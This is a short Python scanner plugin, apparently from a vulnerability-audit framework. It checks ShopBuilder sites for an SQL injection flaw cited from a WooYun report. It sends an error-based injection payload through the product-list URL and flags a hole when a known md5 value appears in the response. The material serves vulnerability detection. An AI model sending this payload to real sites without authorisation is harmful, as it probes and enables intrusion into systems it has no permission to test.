#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = '1c3z' 
#ref=http://wooyun.org/bugs/wooyun-2014-080770

def assign(service, arg):
    if service == "shopbuilder":
        return True, arg

def audit(arg):
    payload = "%27%20and%201=extractvalue(1,concat(0x3a,md5(3.14),0x3a))%23"
    url = arg + '?m=product&s=list&ptype=0' + payload
    code, head, res, errcode,finalurl =  curl.curl(url)
    if code == 200 and "4beed3b9c4a886067de0e3a094246f78" in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('shopbuilder', 'http://127.0.0.1/ShoplBuilder_v5.6/')[1])